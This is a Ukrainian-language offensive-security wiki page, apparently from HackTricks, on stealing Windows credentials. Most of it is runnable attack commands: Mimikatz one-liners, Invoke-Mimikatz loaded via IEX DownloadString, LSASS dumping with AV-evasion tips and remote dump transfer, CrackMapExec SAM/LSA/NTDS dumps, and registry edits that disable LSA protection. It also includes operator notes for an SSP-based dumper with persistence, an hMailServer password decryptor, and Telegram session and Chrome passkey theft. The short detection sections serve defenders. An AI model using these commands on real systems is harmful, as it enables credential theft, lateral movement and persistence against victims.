# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Дізнайтеся, що ще вміє Mimikatz, на** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Дізнайтеся про деякі можливі способи захисту облікових даних тут.**](credentials-protections.md) **Цей захист може завадити Mimikatz отримати деякі облікові дані.**

## Облікові дані за допомогою Meterpreter

Скористайтеся [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **який** я створив, щоб **шукати паролі та хеші** на комп’ютері жертви.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, Defender його не виявляє.\
За допомогою цього інструмента можна **створити дамп процесу lsass**, **завантажити дамп** і **локально витягти облікові дані** з дампа.

Також можна скористатися [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявляти** використання **procdump.exe для створення дампа lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" і "lsass.exe"**. Тому **непомітніше** передавати **як аргумент** **PID** lsass.exe для procdump, **замість** **назви lsass.exe**.

### Dumping lsass за допомогою **comsvcs.dll**

DLL під назвою **comsvcs.dll**, розташована в `C:\Windows\System32`, відповідає за **створення дампа пам’яті процесу** у разі аварійного завершення роботи. Ця DLL містить **функцію** під назвою **`MiniDumpW`**, яку призначено для виклику за допомогою `rundll32.exe`.\
Перші два аргументи не мають значення, але третій складається з трьох компонентів. Першим компонентом є ID процесу, для якого створюється дамп, другим — шлях до файлу дампа, а третім має бути виключно слово **full**. Інших варіантів немає.\
Після розбору цих трьох компонентів DLL створює файл дампа та записує до нього пам’ять указаного процесу.\
**comsvcs.dll** можна використовувати для створення дампа процесу lsass, що позбавляє потреби завантажувати й запускати procdump. Цей метод докладно описано тут: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Для запуску використовується така команда:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Цей процес можна автоматизувати за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Клацніть правою кнопкою миші на панелі завдань і виберіть «Диспетчер завдань».
2. Натисніть «Докладніше».
3. На вкладці «Процеси» знайдіть процес «Local Security Authority Process».
4. Клацніть правою кнопкою миші на процесі «Local Security Authority Process» і виберіть «Створити файл дампа».

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — це підписаний Microsoft бінарний файл, що входить до складу набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Уже наявний дамп аварійного завершення всієї системи або його стиснена копія в доступній теці користувача можуть містити дані облікових даних для аналізу офлайн. Назви файлів, як-от `MEMORY.DMP` і `MEMORY.7z`, — це лише підказки для пошуку: перевірте походження файлів і доступ до них та не припускайте, що вони містять придатні до використання або актуальні облікові дані.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Створення дампу lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це інструмент для створення дампів захищених процесів, який підтримує обфускацію дампу пам’яті та його передавання на віддалені робочі станції без запису на диск.

**Основні функції**:

1. Обхід захисту PPL
2. Обфускація файлів дампу пам’яті для обходу механізмів Defender, що виявляють загрози на основі сигнатур
3. Завантаження дампу пам’яті за допомогою методів RAW і SMB без запису на диск (безфайловий дамп)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – дампінг LSASS на основі SSP без MiniDumpWriteDump

Ink Dragon використовує dumper із трьох етапів під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тож EDR-хуки для цього API не спрацьовують:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – шукає у `fdp.dll` placeholder із 32 малих літер `d`, замінює його абсолютним шляхом до `rtu.txt`, зберігає пропатчену DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливу DLL як нового Security Support Provider (SSP).
2. **Stage 2 всередині LSASS** – коли LSASS завантажує `nfdp.dll`, DLL зчитує `rtu.txt`, застосовує XOR до кожного байта з ключем `0x20` і відображає декодований blob у пам’ять перед передаванням керування.
3. **Stage 3 dumper** – завантажений у пам’ять payload повторно реалізує логіку MiniDump за допомогою **direct syscalls**, визначених за хешованими назвами API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціально призначений export під назвою `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснений дамп LSASS у файл і закриває handle, щоб exfiltration можна було виконати пізніше.

Примітки для оператора:

* Тримайте `lals.exe`, `fdp.dll`, `nfdp.dll` і `rtu.txt` в одній директорії. Stage 1 замінює hard-coded placeholder абсолютним шляхом до `rtu.txt`, тому розміщення файлів у різних місцях порушить ланцюжок.
* Реєстрація відбувається додаванням `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Це значення можна додати самостійно, щоб LSASS повторно завантажував SSP під час кожного запуску системи.
* Файли `%TEMP%\*.ddt` — це стиснені дампи. Розпакуйте їх локально, а потім передайте Mimikatz/Volatility для вилучення облікових даних.
* Для запуску `lals.exe` потрібні права адміністратора/SeTcb, щоб `AddSecurityPackageA` спрацював; щойно виклик повернеться, LSASS непомітно завантажить rogue SSP і виконає Stage 2.
* Видалення DLL із диска не вивантажує її з LSASS. Видаліть запис реєстру та перезапустіть LSASS (перезавантажте систему) або залиште його для довготривалого persistence.

## CrackMapExec

### Dump SAM-хешів

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump секретів LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Скинути NTDS.dit із цільового DC

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Вивантаження історії паролів NTDS.dit із цільового DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Викрадення SAM і SYSTEM

Ці файли мають бути **розташовані** в _C:\windows\system32\config\SAM_ і _C:\windows\system32\config\SYSTEM._ Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли — отримати їхню копію з реєстру:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Завантажте** ці файли на свою машину Kali та **витягніть хеші** за допомогою:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Тіньова копія тому

За допомогою цієї служби можна копіювати захищені файли. Потрібні права адміністратора.

#### Використання vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Але те саме можна зробити за допомогою **Powershell**. Ось приклад **копіювання файлу SAM** (використовується диск «C:», а файл зберігається в C:\users\Public), але цей спосіб можна використати для копіювання будь-якого захищеного файлу:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Код із книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Нарешті, можна також скористатися [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб створити копії SAM, SYSTEM і ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Облікові дані Active Directory — NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory**: у ньому зберігаються важливі дані про об’єкти користувачів, групи та їхнє членство. Саме в ньому зберігаються **password hashes** користувачів домену. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за шляхом **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних є три основні таблиці:

- **Таблиця даних**: у ній зберігаються відомості про об’єкти, наприклад користувачів і групи.
- **Таблиця зв’язків**: у ній відстежуються зв’язки, наприклад членство в групах.
- **Таблиця SD**: тут зберігаються **дескриптори безпеки** кожного об’єкта, що забезпечують безпеку та контроль доступу до збережених об’єктів.

У дослідженні рівня баз даних Крістоффера Андерссона ці таблиці та особливості їхньої роботи в різних версіях описано докладніше.<sup>[[8]](#references)</sup>

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, а його використовує _lsass.exe_. Тому **частина** файлу **NTDS.dit** може бути розташована **в пам’яті `lsass`** (імовірно, там можна знайти останні дані, до яких зверталися, завдяки використанню **кешу** для підвищення продуктивності).

#### Розшифрування хешів у NTDS.dit

Хеш шифрується тричі:

1. Розшифруйте ключ шифрування паролів (**PEK**) за допомогою **BOOTKEY** і **RC4**.
2. Розшифруйте **hash** за допомогою **PEK** і **RC4**.
3. Розшифруйте **hash** за допомогою **DES**.

**PEK** має **однакове значення на кожному контролері домену**, але він **зашифрований** у файлі **NTDS.dit** за допомогою специфічного для контролера домену **BOOTKEY** із його куща **SYSTEM**. Тому для отримання облікових даних потрібні і **NTDS.dit**, і **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно, починаючи з Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Ви також можете скористатися трюком із [**volume shadow copy**](#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам’ятайте, що вам також знадобиться копія **файлу SYSTEM** (знову ж таки, скористайтеся трюком — [**витягніть його з реєстру або використайте volume shadow copy**](#stealing-sam-and-system)).

### **Витягування хешів із NTDS.dit**

Отримавши файли **NTDS.dit** і **SYSTEM**, ви можете скористатися такими інструментами, як _secretsdump.py_, щоб **витягнути хеші**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Також можна **автоматично витягти їх** за допомогою дійсного облікового запису адміністратора домену:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Для **великих файлів NTDS.dit** рекомендується виконувати вилучення за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Нарешті, можна також скористатися **модулем metasploit**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Вилучення об’єктів домену з NTDS.dit до бази даних SQLite**

Об’єкти NTDS можна вилучити до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Вилучаються не лише секрети, а й усі об’єкти та їхні атрибути для подальшого отримання інформації, якщо вихідний файл NTDS.dit уже отримано.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive `SYSTEM` є необов’язковим, але дає змогу розшифрувати секрети (хеші NT і LM, додаткові облікові дані, як-от паролі у відкритому вигляді, ключі Kerberos або довірчих відносин, історію паролів NT і LM). Разом з іншою інформацією витягуються такі дані: облікові записи користувачів і комп’ютерів із їхніми хешами, прапорці UAC, часові позначки останнього входу й зміни пароля, описи облікових записів, імена, UPN, SPN, групи та рекурсивне членство в них, дерево організаційних підрозділів і членство в них, довірені домени із типом, напрямком та атрибутами довірчих відносин...

## Lazagne

Завантажте бінарний файл [тут](https://github.com/AlessandroZ/LaZagne/releases). Цей бінарний файл можна використовувати для вилучення облікових даних із різних програм.

```
lazagne.exe all
```

## Інші інструменти для вилучення облікових даних із SAM і LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для вилучення облікових даних із пам’яті. Завантажте його звідси: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Вилучення облікових даних із файлу SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Витягування облікових даних із файлу SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Завантажте його звідси:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **запустіть**, щоб витягти паролі.

## Збирання даних про неактивні RDP-сеанси та послаблення засобів безпеки

RAT FinalDraft від Ink Dragon містить задачу `DumpRDPHistory`, методи якої стануть у пригоді будь-якому red-teamer:<sup>[[3]](#references)</sup>

### Збирання телеметрії в стилі DumpRDPHistory

* **Цільові вузли вихідних RDP-з’єднань** — виконайте розбір кожного куща користувача за адресою `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підрозділ містить назву сервера, `UsernameHint` і час останнього запису. Відтворити логіку FinalDraft можна за допомогою PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Свідчення вхідних RDP-підключень** — перевірте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` на наявність подій з ID **21** (успішний вхід) і **25** (відключення), щоб з’ясувати, хто адміністрував цей комп’ютер:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Коли ви дізнаєтеся, який Domain Admin регулярно підключається, зніміть дамп LSASS (за допомогою LalsDumper/Mimikatz), поки його **відключений** сеанс ще існує. CredSSP + резервний перехід на NTLM залишають у LSASS його верифікатор і токени, які потім можна повторно використати через SMB/WinRM, щоб отримати `NTDS.dit` або закріпитися на контролерах домену.

### Зниження рівня захисту реєстру, націлені на FinalDraft

Цей самий імплант також змінює кілька ключів реєстру, щоб спростити викрадення облікових даних:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Налаштування `DisableRestrictedAdmin=1` примусово вмикає повне повторне використання облікових даних/квитків під час RDP, що дає змогу виконувати pivot-и на кшталт pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, тому локальні адміністратори отримують необмежені токени через мережу.
* `DSRMAdminLogonBehavior=2` дає адміністратору DSRM змогу входити в систему, поки DC працює, надаючи зловмисникам ще один вбудований обліковий запис із високими привілеями.
* `RunAsPPL=0` знімає захист LSASS PPL, значно спрощуючи доступ до пам’яті для інструментів дампу, таких як LalsDumper.

## Облікові дані конфігурації hMailServer (після компрометації)

Залежно від структури встановлення перевірте відповідні файли конфігурації: `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` і `C:\ProgramData\hMailServer\hMailServer.ini`. Доступне для читання непорожнє значення `[Security] AdministratorPassword=` — це хеш пароля адміністратора hMailServer; воно не свідчить про пароль адміністратора Windows. Якщо ці облікові дані буде відновлено, для переходу до облікового запису Windows потрібно окремо підтвердити повторне використання пароля та наявність прав на вхід.

Для інсталяцій, що використовують базу даних SQL CE, окреме значення `[Database] Password=` у файлі INI захищає базу даних. У застарілих інсталяціях це значення зашифровано Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і перестановкою порядку байтів у 4-байтових словах. Використайте hex-рядок із файлу INI з таким фрагментом Python:<sup>[[2]](#references)</sup>

Спершу переконайтеся, що поточний обліковий запис може читати **і** файл INI, **і** відповідну базу даних SQL CE `.sdf`. Пароль із файлу INI захищає базу даних; він відрізняється від хешів облікових записів поштових скриньок, що зберігаються всередині неї. Переглядайте або оновлюйте **копію** бази даних, яка використовується, а не робочий файл.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Маючи пароль у відкритому вигляді, скопіюйте базу даних SQL CE, щоб уникнути блокування файлів, завантажте 32-бітний provider і за потреби оновіть його перед запитом хешів:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Стовпець `accountpassword` використовує формат хешу hMailServer (режим `1421` у hashcat). Зламаний пароль поштової скриньки дає змогу перейти до облікового запису Windows лише тоді, коли цей пароль повторно використовується локальним або доменним обліковим записом і цей обліковий запис має необхідні права для віддаленого входу.

## Перехоплення callback-функції входу LSA (LsaApLogonUserEx2)

Деякі інструменти перехоплюють **паролі входу у plaintext**, перехоплюючи callback-функцію входу LSA `LsaApLogonUserEx2`. Ідея полягає в тому, щоб перехопити або обгорнути callback-функцію пакета автентифікації, аби зібрати облікові дані **під час входу** (до хешування), а потім записати їх на диск або повернути оператору. Зазвичай це реалізовано як допоміжний компонент, який впроваджується в LSA або реєструється в ньому, а потім фіксує кожну успішну подію інтерактивного або мережевого входу разом з іменем користувача, доменом і паролем.<sup>[[1]](#references)</sup>

Операційні примітки:
- Щоб завантажити допоміжний компонент у шлях автентифікації, потрібні права локального адміністратора або SYSTEM.
- Перехоплені облікові дані з’являються лише під час входу (інтерактивного, через RDP, службового або мережевого — залежно від перехоплення).

## Збережені облікові дані підключень SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) зберігає інформацію про підключення в окремому для кожного користувача файлі `sqlstudio.bin`. Спеціалізовані утиліти для дампу можуть розібрати файл і відновити збережені облікові дані SQL. У командних оболонках, які повертають лише вивід команд, файл часто ексфільтрують, кодувавши його в Base64 і вивівши до stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

На боці оператора перебудуйте файл і запустіть dumper локально, щоб відновити облікові дані:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Викрадення сесії Telegram Desktop `tdata`

Telegram Desktop зберігає дані авторизації та стан облікового запису у своєму каталозі **`tdata`**. Скопійовану сесію можна завантажити за допомогою сумісних інструментів для автентифікації без пароля облікового запису, поки ця авторизація залишається дійсною; якщо ввімкнено шифрування локальних даних, викрадачу також потрібен код доступу. Після автентифікації сесія може розкрити дані про особу, метадані діалогів і членства, повідомлення та медіафайли, доступні для завантаження.<sup>[[10]](#references)</sup>

### Виявлення та отримання

Шукайте як у встановлених, так і в портативних версіях; назви пакетів Microsoft Store відрізняються, тому перелічіть каталоги пакетів, що містять `TelegramMessenge`, і перевірте їхнє піддерево `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Якщо звичайне читання не вдається, а токен процесу **вже містить і має ввімкнений** `SeBackupPrivilege`, доступ із підтримкою резервного копіювання забезпечує запасний варіант; він не надає привілей і не підвищує привілеї процесу. `CreateFileW` із `FILE_FLAG_BACKUP_SEMANTICS` може запитувати семантику резервного копіювання/відновлення та обходити перевірки безпеки файлів, якщо токен має необхідні привілеї, але сам прапорець не обходить несумісне блокування спільного доступу.<sup>[[10]](#references)[[11]](#references)</sup>

Для активних заблокованих файлів створіть/прочитайте **Volume Shadow Copy**; для файлів, доступ до яких обмежено ACL, `robocopy /B` використовує режим резервного копіювання та обходить ACL файлів і каталогів.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Імплант, що економить трафік, може спочатку надіслати лише перелік шляхів до файлів, отримати ідентифікатор знімка та список шляхів, які вже зберігаються на C2, а потім завантажити лише відсутні файли. Тому невеликі інкрементальні передавання даних після рекурсивного переліку `tdata` усе одно можуть свідчити про успішне викрадення сесії.<sup>[[10]](#references)</sup>

### Виявлення та стримування

Корелюйте рекурсивний доступ до `tdata` з боку процесу, що не належить Telegram, з увімкненням `SeBackupPrivilege`, відкриттям файлів із семантикою резервного копіювання, активністю VSS або дочірнім процесом `robocopy.exe`, що використовує `/B`. Також шукайте швидкий перелік вмісту обох `%APPDATA%` і `%LOCALAPPDATA%\Packages`, за яким ідуть вихідні з’єднання з того самого процесу. Після компрометації скористайтеся **Налаштування → Пристрої** (або **Конфіденційність і безпека → Активні сесії**), щоб завершити невідомі сесії; саме лише ввімкнення двоетапної перевірки не відкликає вже викрадену авторизацію.<sup>[[10]](#references)[[13]](#references)</sup>

## Викрадення облікових даних Passkeys / WebAuthn із Chrome у Windows

Якщо на хості Windows із **Chrome + синхронізованими Passkeys у Google Password Manager** вдається виконати код від імені **користувача-жертви**, Passkeys стають цікавою ціллю для post-exploitation навіть **без прав адміністратора/SYSTEM**.<sup>[[4]](#references)</sup>

### Цікаві локальні артефакти

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** зберігає записи **`WebauthnCredentialSpecifics`**, закодовані у форматі protobuf. Процес того самого користувача може перерахувати **RP ID**, **ім’я користувача**, **ідентифікатор облікових даних** і зашифрований матеріал приватного ключа для синхронізованих passkey.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** зберігає стан реєстрації локального пристрою, як-от **`wrapped_identity_private_key`** і загорнутий секрет, що використовується для відновлення синхронізованих облікових даних.<sup>[[4]](#references)</sup>

Швидка перевірка:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-прив’язані blobs ключів усе ще можна зловживати як локальним оракулом підпису

Якщо браузер експортує ключ ідентифікації на основі TPM як **`NCRYPT_OPAQUE_KEY_BLOB`** і зберігає цей blob у стані, доступному користувачу, malware **не потрібно** витягувати необроблений приватний ключ. Воно може просто повторно імпортувати blob на **тому самому комп’ютері** й попросити локальний TPM підписати дані, контрольовані зловмисником:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Це означає, що **прив’язка до апаратного забезпечення унеможливлює експорт за межі пристрою, але не використання тим самим користувачем на скомпрометованій кінцевій точці**.

### Практичні шляхи зловживання

1. **Pass-ta-key / ретрансляція ідентичності пристрою**<sup>[[4]](#references)</sup>
   - Перелічити `WebauthnCredentialSpecifics` у Chrome LevelDB.
   - Розпочати вхід за допомогою passkey і отримати свіжий WebAuthn challenge.
   - Використати викрадений blob `wrapped_identity_private_key` на TPM жертви, щоб підписати прив’язку запиту cloud-authenticator.
   - Передати отриманий assertion relying party.
   - Це особливо цінно, коли RP приймає `userVerification=preferred` або не відхиляє assertions з **`UV=0`**.
2. **Перехоплення незавершеного UV-ключа**<sup>[[4]](#references)</sup>
   - Примусово запустити повторне налаштування, видаливши `passkey_enclave_state` або надіславши дійсну підписану операцію `device/forget`.
   - Якщо після налаштування пристрій залишається в стані **`uv_key_pending`**, зареєструвати контрольований зловмисником відкритий UV-ключ.
   - Якщо провайдер не перевіряє attestation / походження ключа з безпечного апаратного забезпечення для нового UV-ключа, подальші підписи ключем зловмисника вважатимуться такими, що мають **`UV=1`**.
3. **Викрадення master secret / відновлення SDS**<sup>[[4]](#references)</sup>
   - Примусово запустити відновлення або повторне приєднання, щоб Chrome отримав синхронізований master secret passkey.
   - Відстежувати повторне створення/зміну `passkey_enclave_state`, а потім зняти дамп пам’яті Chrome, поки у ній перебуває відкритий текст **секрету домену безпеки (SDS)**.
   - Використати відновлений SDS для розшифрування зашифрованих полів у кожному записі `WebauthnCredentialSpecifics` і відновити переносні приватні ключі WebAuthn.

### Ідеї для DFIR / виявлення

- Відстежувати **видалення/повторне створення** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Створювати сповіщення про аномальний доступ до Chrome **`Sync Data\LevelDB`** з боку процесів, що не є браузерами.
- Створювати сповіщення про **дампи пам’яті Chrome** або підозрілий доступ до пам’яті між процесами.
- Розслідувати повторні запити **PIN-коду відновлення Google Password Manager** або неочікуване повторне налаштування.
